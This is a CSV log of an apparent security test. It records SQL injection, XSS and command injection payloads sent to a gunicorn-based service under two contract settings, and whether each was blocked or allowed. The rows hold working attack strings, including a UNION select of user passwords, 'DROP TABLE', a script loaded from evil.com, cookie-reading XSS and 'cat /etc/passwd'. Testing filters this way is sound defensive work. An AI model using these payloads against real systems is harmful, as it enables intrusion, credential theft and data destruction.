timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,response_body
2025-10-12T18:21:59.095990,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.101421,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.207620,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.209665,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.315165,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.322991,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.431733,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T18:21:59.438301,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""SQLi Union"", ""status"": ""pattern_received""}"
2025-10-12T18:21:59.547630,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.554190,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.658703,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.664979,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.773513,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.780133,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.886512,SQLi,Authentication Bypass,admin'--,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:21:59.892865,SQLi,Authentication Bypass,admin'--,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.001855,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.008633,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.119658,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.126375,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.236128,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:22:00.242525,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:22:00.351699,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:22:00.357963,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Img XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:22:00.467052,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.473234,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.581763,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.587309,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.695784,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.701955,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.810034,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:22:00.816191,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Basic XSS"", ""status"": ""pattern_received""}"
2025-10-12T18:22:00.923479,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:00.929792,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.038612,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.044371,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.152905,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.158589,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.267051,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.272873,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.377628,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.383598,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,"{""status"": ""pattern_not_recognized""}"
2025-10-12T18:22:01.492628,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:22:01.498892,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:22:01.608291,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-12T18:22:01.613315,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
